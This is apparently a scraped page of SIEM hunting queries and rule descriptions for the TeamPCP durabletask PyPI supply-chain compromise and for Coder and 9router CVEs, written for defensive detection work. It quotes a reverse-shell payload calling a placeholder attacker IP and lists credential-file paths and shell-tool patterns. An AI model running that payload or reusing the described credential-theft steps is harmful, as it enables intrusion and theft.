        | where SHA256 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9") or SHA1 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9") or MD5 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9") or SHA1 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9") or MD5 in~ ("CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["CB4E50433336707381429707F59C3CBE8D497D98", "1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7", "7DCFE9EE25841DFD58D3D6871BF867FE32141DFB", "77F1970D620216C5FFF4E14A6CCC13FCCC267217", "948159A7FC2E688386864BEA59FD40DFFC4B24D6", "A3C077BDF8898E612CCD65BC82E7960834ADB2A9"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] AWS SSM SendCommand Fan-out from EC2 Instance Role (TeamPCP Worm Propagation) · [LLM] Python Process Reading Multi-Cloud Credential Stores (durabletask Stealer Stage) · OAuth consent / suspicious app grant
[LLM] Compromised Microsoft durabletask PyPI Package Install (TeamPCP 1.4.1-1.4.3) Delivery High
Detects pip/python installing the TeamPCP-compromised durabletask versions (1.4.0-1.4.3) — Microsoft's Durable Task Python SDK was published with a malicious dropper that fetches rope.pyz. Article-specific because it pins the exact package + version range named in the campaign. Rationale: Anchors on the exact package name 'durabletask' and version range from the article's code blocks plus external corroboration (Wiz, safedep, Aikido confirmed 1.4.1-1.4.3 as the malicious versions published 2026-05-19). pip+package-name+specific-version is high-fidelity — there is no legitimate reason to pin those exact malicious versions. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://www.stepsecurity.io/blog/microsofts-durabletask-pypi-package-compromised-in-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud
ATT&CKT1195.002 T1059.006
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("pip","pip3","python","python3","python3.10","python3.11","python3.12")
    or InitiatingProcessFileName in~ ("pip","pip3","python","python3")
| where ProcessCommandLine has "durabletask" or InitiatingProcessCommandLine has "durabletask"
| where ProcessCommandLine has_any ("1.4.1","1.4.2","1.4.3","==1.4.")
    or InitiatingProcessCommandLine has_any ("1.4.1","1.4.2","1.4.3","==1.4.")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("pip","pip3","python","python3")
| where ActingProcessCommandLine has "durabletask"
| where ActingProcessCommandLine has_any ("1.4.1","1.4.2","1.4.3","==1.4.")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

[LLM] TeamPCP rope.pyz Dropper Fetch from check.git-service.com C2 Command & Control High
Detects DNS, HTTP, or direct-IP egress to the TeamPCP C2 infrastructure that hosts the durabletask second-stage dropper (rope.pyz). Article-specific because it pins the exact filename and the campaign's named C2 domains. Rationale: Uses the exact payload filename 'rope.pyz' from article code-block 3 and the campaign C2 domain check.git-service.com confirmed by Wiz, safedep, and Aikido. No legitimate developer infrastructure resolves these domains — they were registered 2026-05-16 by the actor and have no clean use case. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud • https://thehackernews.com/2026/05/github-investigating-teampcp-claimed.html

[LLM] TeamPCP rope.pyz Dropper Infection Markers on Linux Installation High
Detects creation of TeamPCP's on-disk artifacts from the durabletask compromise: the rope.pyz / managed.pyz dropper payloads in /tmp/ and the ~/.cache/.sys-update-check infection marker. Article-specific because rope.pyz is named verbatim in code block 3. Rationale: Anchors on the verbatim 'rope.pyz' filename from article code block 3, plus the marker files /tmp/managed.pyz and ~/.cache/.sys-update-check confirmed by Wiz, safedep, and Aikido as the dropper's on-disk artifacts. None of these paths/filenames have legitimate Linux usage — they are unique to this campaign. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud
ATT&CKT1105 T1036.005
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where (FolderPath has "/tmp/" and (FileName matches regex @"^rope-.+\.pyz$" or FileName =~ "rope.pyz" or FileName =~ "managed.pyz"))
    or (FolderPath has "/.cache/" and FileName in~ (".sys-update-check",".sys-update-check-k8s"))
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, FileName, SHA256, FileSize
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType in ("FileCreated","FileModified")
| where (TargetFilePath has "/tmp/" and (TargetFileName matches regex @"^rope-.+\.pyz$" or TargetFileName =~ "rope.pyz" or TargetFileName =~ "managed.pyz"))
    or (TargetFilePath has "/.cache/" and TargetFileName in~ (".sys-update-check",".sys-update-check-k8s"))
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileSHA256
| order by TimeGenerated desc

[LLM] AWS SSM SendCommand Fan-out from EC2 Instance Role (TeamPCP Worm Propagation) Actions on Objectives Medium
Detects the durabletask worm's lateral-movement stage: a single EC2-instance IAM role calling ssm:SendCommand against multiple EC2 instances within a short window. The rope.pyz worm uses stolen instance-role credentials to push itself to peer instances via SSM RunCommand. Rationale: Captures the worm's worm-stage primitive (ssm:SendCommand from an instance role to peer instances) which Wiz and safedep flagged as the AWS-specific propagation method. CloudTrail-only — Defender XDR and Falcon FDR don't ingest AWS control-plane events, hence empty defender_kql / falcon_logscale_query. Sentinel has the AWSCloudTrail connector but the table isn't in our canonical schema, so left empty rather than guess column names. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/
ATT&CKT1021.007 T1651 T1078.004
Data sourcesChange.All_Changes
source:cloudtrail @evt.name:SendCommand @userIdentity.type:AssumedRole @requestParameters.instanceIds:* (-@userAgent:(*aws-cli/* AND *root/*) AND -@userIdentity.sessionContext.sessionIssuer.userName:(*ssm-automation* OR *patch-manager* OR *config-rule*))
CLOUD
`cloudtrail` eventName=SendCommand eventSource="ssm.amazonaws.com" "userIdentity.type"="AssumedRole" 
| eval source_role=mvindex(split('userIdentity.sessionContext.sessionIssuer.arn',"/"),-1)
| eval target_count=mvcount('requestParameters.instanceIds{}')
| stats latest(_time) as last_seen dc('requestParameters.instanceIds{}') as DistinctTargets values('requestParameters.instanceIds{}') as Targets values(sourceIPAddress) as SourceIPs values(userAgent) as UAs by source_role 'userIdentity.arn' awsRegion
| where DistinctTargets >= 3 OR like(source_role, "%ec2%") OR like(source_role, "%-instance-%")
| sort 0 -last_seen
[LLM] Python Process Reading Multi-Cloud Credential Stores (durabletask Stealer Stage) Actions on Objectives Medium
Detects a single Python process opening credential files from THREE OR MORE distinct cloud/dev ecosystems within a 5-minute window — the signature behaviour of the rope.pyz multi-cloud stealer that harvests AWS, Azure, GCP, Kubernetes, npm, GitHub, Docker, and SSH secrets in one pass. Rationale: Targets the rope.pyz second-stage behaviour that Wiz and safedep documented: a single python process enumerating credentials across AWS + Azure + GCP + Kubernetes + npm + GitHub + Docker + SSH within seconds. The DistinctSecretFamilies>=3 threshold eliminates legitimate cloud SDKs that touch one ecosystem at a time while still catching the multi-cloud stealer in a single hit. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/
ATT&CKT1552.001 T1555.005 T1528
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileOpened","FileCreated","FileRenamed")
| where InitiatingProcessFileName in~ ("python","python3","python3.10","python3.11","python3.12")
| extend SecretFamily = case(
    FolderPath has "/.aws/","aws",
    FolderPath has "/.azure/","azure",
    FolderPath has "/.config/gcloud/","gcp",
    FolderPath has "/.kube/","k8s",
    FolderPath has "/.docker/","docker",
    FileName =~ ".npmrc","npm",
    FileName =~ ".git-credentials","git",
    FolderPath has "/.config/gh/" and FileName =~ "hosts.yml","gh",
    FolderPath has "/.ssh/" and FileName startswith "id_","ssh",
    "other")
| where SecretFamily != "other"
| summarize DistinctSecretFamilies = dcount(SecretFamily), SecretFamilies = make_set(SecretFamily), PathSample = make_set(strcat(FolderPath,"/",FileName), 20), Cmd = any(InitiatingProcessCommandLine), arg_min(Timestamp, *) by DeviceName, InitiatingProcessAccountName, InitiatingProcessId, bin(Timestamp, 5m)
| where DistinctSecretFamilies >= 3
| where InitiatingProcessAccountName !endswith "$"
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("python","python3")
| extend SecretFamily = case(
    TargetFilePath has "/.aws/","aws",
    TargetFilePath has "/.azure/","azure",
    TargetFilePath has "/.config/gcloud/","gcp",
    TargetFilePath has "/.kube/","k8s",
    TargetFilePath has "/.docker/","docker",
    TargetFileName =~ ".npmrc","npm",
    TargetFileName =~ ".git-credentials","git",
    TargetFilePath has "/.config/gh/" and TargetFileName =~ "hosts.yml","gh",
    TargetFilePath has "/.ssh/" and TargetFileName startswith "id_","ssh",
    "other")
| where SecretFamily != "other"
| summarize DistinctSecretFamilies = dcount(SecretFamily), SecretFamilies = make_set(SecretFamily), PathSample = make_set(TargetFilePath, 20), Cmd = any(ActingProcessCommandLine), arg_min(TimeGenerated, *) by DvcHostname, ActorUsername, ActingProcessId, bin(TimeGenerated, 5m)
| where DistinctSecretFamilies >= 3
| order by TimeGenerated desc
source:linux.auditd (@auditd.type:OPENAT OR @auditd.type:PATH) @process.executable.path:(*/python OR */python3 OR */python3.*) @file.path:(*/.aws/credentials OR */.aws/config OR */.azure/accessTokens.json OR */.azure/azureProfile.json OR */.config/gcloud/credentials.db OR */.config/gcloud/application_default_credentials.json OR */.kube/config OR */.npmrc OR */.docker/config.json OR */.git-credentials OR */.config/gh/hosts.yml OR */.ssh/id_*)
#event_simpleName=FileOpenInfo ContextImageFileName=/\/python3?(\.\d+)?$/i TargetFileName=/(\/\.aws\/(credentials|config)|\/\.azure\/(accessTokens|azureProfile)\.json|\/\.config\/gcloud\/(credentials\.db|application_default_credentials\.json)|\/\.kube\/config|\/\.npmrc|\/\.docker\/config\.json|\/\.git-credentials|\/\.config\/gh\/hosts\.yml|\/\.ssh\/id_)/i
| case {
    TargetFileName=/\.aws\// | SecretFamily:="aws";
    TargetFileName=/\.azure\// | SecretFamily:="azure";
    TargetFileName=/gcloud\// | SecretFamily:="gcp";
    TargetFileName=/\.kube\// | SecretFamily:="k8s";
    TargetFileName=/\.docker\// | SecretFamily:="docker";
    TargetFileName=/\.npmrc/ | SecretFamily:="npm";
    TargetFileName=/\.git-credentials|\.config\/gh\// | SecretFamily:="git";
    TargetFileName=/\.ssh\/id_/ | SecretFamily:="ssh";
    *;
  }
| groupBy([aid, ComputerName, ContextProcessId], function=[count(field=SecretFamily, distinct=true, as=DistinctFamilies), collect([SecretFamily, TargetFileName])])
| DistinctFamilies>=3
CLOUD
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count from datamodel=Endpoint.Filesystem where Filesystem.process_name IN ("python","python3","python3.10","python3.11","python3.12") AND (Filesystem.file_path="*/.aws/credentials" OR Filesystem.file_path="*/.aws/config" OR Filesystem.file_path="*/.azure/accessTokens.json" OR Filesystem.file_path="*/.azure/azureProfile.json" OR Filesystem.file_path="*/.config/gcloud/credentials.db" OR Filesystem.file_path="*/.config/gcloud/application_default_credentials.json" OR Filesystem.file_path="*/.kube/config" OR Filesystem.file_path="*/.npmrc" OR Filesystem.file_path="*/.docker/config.json" OR Filesystem.file_path="*/.git-credentials" OR Filesystem.file_path="*/.config/gh/hosts.yml" OR Filesystem.file_path="*/.ssh/id_*") by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.process_id Filesystem.file_path _time | `drop_dm_object_name(Filesystem)` | bin _time span=5m | stats dc(file_path) as DistinctSecretFamilies values(file_path) as Paths min(_time) as first by dest user process_id _time | where DistinctSecretFamilies >= 3 | sort 0 -first
| tstats summariesonly=false count from datamodel=Endpoint.Filesystem where Filesystem.process_name IN ("python","python3","python3.10","python3.11","python3.12") AND (Filesystem.file_path="*/.aws/credentials" OR Filesystem.file_path="*/.aws/config" OR Filesystem.file_path="*/.azure/accessTokens.json" OR Filesystem.file_path="*/.azure/azureProfile.json" OR Filesystem.file_path="*/.config/gcloud/credentials.db" OR Filesystem.file_path="*/.config/gcloud/application_default_credentials.json" OR Filesystem.file_path="*/.kube/config" OR Filesystem.file_path="*/.npmrc" OR Filesystem.file_path="*/.docker/config.json" OR Filesystem.file_path="*/.git-credentials" OR Filesystem.file_path="*/.config/gh/hosts.yml" OR Filesystem.file_path="*/.ssh/id_*") by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.process_id Filesystem.file_path _time | `drop_dm_object_name(Filesystem)` | bin _time span=5m | stats dc(file_path) as DistinctSecretFamilies values(file_path) as Paths min(_time) as first by dest user process_id _time | where DistinctSecretFamilies >= 3 | sort 0 -first

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities

DeviceTvmSoftwareVulnerabilities

| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-46412")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-46412")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-46412")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity

// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs

| where OperationName has "Consent to application"
| where Result =~ "success"

| order by TimeGenerated desc

Data sourcesEndpoint.Processes DeviceProcessEvents

| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")

SecurityEvent

   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"

id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or SHA1 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or MD5 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or SHA1 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or MD5 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

[LLM] Coder CVE-2026-46354 - Burst of azure-instance-identity POSTs (vmId enumeration / forged PKCS#7) Exploitation Medium
Detects multiple POST requests to the unauthenticated /api/v2/workspaceagents/azure-instance-identity endpoint from a single source within a short window — the signature of an attacker enumerating workspace vmId UUIDs to brute-force-redeem agent tokens via the forged PKCS#7 envelope flaw. A legitimate Coder workspace agent only registers once per VM lifetime, so >=5 POSTs to this exact path from one source in 10 minutes is anomalous. Rationale: The endpoint path is uniquely identified in the advisory as the unauthenticated PKCS#7 verification entry point. Burst-from-one-source on this specific path is the visible HTTP-layer shape of vmId UUID enumeration described in the article. Cross-checked Coder's public API docs at coder.com/docs/reference/api/agents to confirm the endpoint exists in legitimate v2 deployments. Defender Advanced Hunting has no native HTTP request log for self-hosted Coder, so defender_kql is intentionally empty. Falcon LogScale FDR does not ship application-layer HTTP request URLs from Coder, so falcon_logscale_query is also empty. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://coder.com/docs/reference/api/agents • https://github.com/coder/coder/pull/25286
ATT&CKT1190 T1133

ImWebSession

| where HttpMethod == "POST"
| where Url has "/api/v2/workspaceagents/azure-instance-identity"
| summarize Attempts = count(),
            Successes = countif(HttpStatusCode in ("200","204")),
            DistinctUserAgents = dcount(HttpRequestHeaderUserAgent),
            FirstSeen = min(TimeGenerated),
            LastSeen = max(TimeGenerated)
            by SrcIpAddr, DstHostname, bin(TimeGenerated, WindowMin)
| where Attempts >= Threshold
| order by Attempts desc

[LLM] Coder CVE-2026-46354 - Agent token redemption: PKCS#7 POST followed by gitsshkey / external-auth GET Actions on Objectives High
Correlates a POST to /api/v2/workspaceagents/azure-instance-identity with a GET to /workspaceagents/me/gitsshkey or /workspaceagents/me/external-auth from the same source IP within 30 minutes — the exact two-step attack flow the advisory documents (forge PKCS#7 envelope → use returned agent session token to pull Git SSH private key and OAuth credentials). This catches the credential-access stage even when a single vmId is targeted (UC1's burst signal misses). Rationale: The advisory explicitly chains POST /azure-instance-identity (token issuance) to GET /me/gitsshkey and GET /me/external-auth (credential read) as the documented post-exploit steps. Same-source-IP join with a 30-minute window captures the attacker round-trip while remaining tight enough to drop unrelated traffic. Endpoints confirmed in Coder's public API reference. Defender XDR lacks application HTTP logs for self-hosted Coder; Falcon FDR same — both left empty by design. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://coder.com/docs/reference/api/agents • https://coder.com/docs/admin/external-auth
ATT&CKT1528 T1552.004 T1190

[LLM] Coder CVE-2026-46354 - Inventory of vulnerable Coder v2 versions Reconnaissance High
Hygiene hunt: enumerate all hosts running an unpatched Coder v2 server using Defender TVM CVE data and surface those that are internet-facing first. The advisory lists six patched lines (v2.33.3 / v2.32.2 / v2.31.12 / v2.30.8 / v2.29.13 / v2.24.5); anything earlier on each line is exploitable without authentication. Pairs with UC1/UC2 to prioritise instances that need either immediate patching or a switch to token-based agent auth. Rationale: DeviceTvmSoftwareVulnerabilities is the canonical Defender table for CVE-based exposure tracking; pairing with DeviceInfo's IsInternetFacing flag surfaces the highest-risk hosts first. The CVE ID and patched-version list come directly from the GHSA advisory body. Datadog logs and Falcon FDR don't carry SBOM/CVE rollups in their standard log tables, so those fields are empty by design. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://github.com/coder/coder/pull/25286
ATT&CKT1190

[LLM] 9router unauthenticated RCE — POST /api/cli-tools/cowork-settings with customPlugins.command Exploitation High
Detects HTTP POST to the unauthenticated 9router cowork-settings endpoint with a customPlugins array containing an executable command field — the registration step of CVE-2026-46339 RCE before the SSE-triggered spawn(). Default Docker exposure is 0.0.0.0:20128. Rationale: The article names the exact vulnerable POST endpoint /api/cli-tools/cowork-settings (src/app/api/cli-tools/cowork-settings/route.js lines 292-319) and the Docker default port 20128. Any external unauthenticated POST to this path is exploitation by definition since the route is unguarded by middleware (src/proxy.js matcher) and the customPlugins.command/args fields are stored verbatim into globalThis.__9routerCustomPlugins. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj

[LLM] 9router Node.js process spawning shell binary (CVE-2026-46339 post-exploit) Installation High
Detects /bin/sh, /bin/bash or other shells spawned with node (server.js / next-server) as the parent process — direct host-side evidence of CVE-2026-46339 plugin-bridge RCE where attacker-controlled command/args reach Node's spawn() via the MCP stdio→SSE bridge. Rationale: The article describes the exact code path src/lib/mcp/stdioSseBridge.js line 138 calling spawn(plugin.command, plugin.args) with attacker-controlled values. The PoC payloads use /bin/sh -c and /bin/bash -i directly, so a node→shell parent-child pair on a 9router host is high-fidelity exploitation evidence — Node.js apps in production rarely shell out to /bin/sh directly. [LLM] Reverse shell from 9router-spawned shell — outbound TCP from node-child bash Command & Control Medium
Detects outbound network connections originating from /bin/bash or /bin/sh processes whose parent is node — the typical reverse-shell post-exploitation pattern of CVE-2026-46339, including the PoC payload `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`. Rationale: The article's PoC explicitly shows `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` as the reverse-shell payload registered via customPlugins.args. Detecting node→bash→outbound-TCP at the EDR layer catches the actual exploitation impact even when web-tier logs are unavailable (reverse-proxy not in scope or container egress). Sentinel KQL omitted: ImNetworkSession lacks initiating-process correlation fields and Linux Syslog/auditd entries reach Sentinel without the structured parent-process linkage needed for high fidelity. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj
ATT&CKT1059.004 T1071.001 T1095
Data sourcesNetwork_Traffic.All_Traffic Endpoint.Processes
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("sh","bash","dash","ash","zsh")
| where InitiatingProcessParentFileName =~ "node"
   or InitiatingProcessCommandLine has_any ("/dev/tcp/","bash -i","nc -e")
| where RemoteIPType == "Public"
| project Timestamp, DeviceName,
          InitiatingProcessAccountName,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine,
          InitiatingProcessParentFileName,
          RemoteIP, RemotePort, RemoteUrl, Protocol
| order by Timestamp desc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
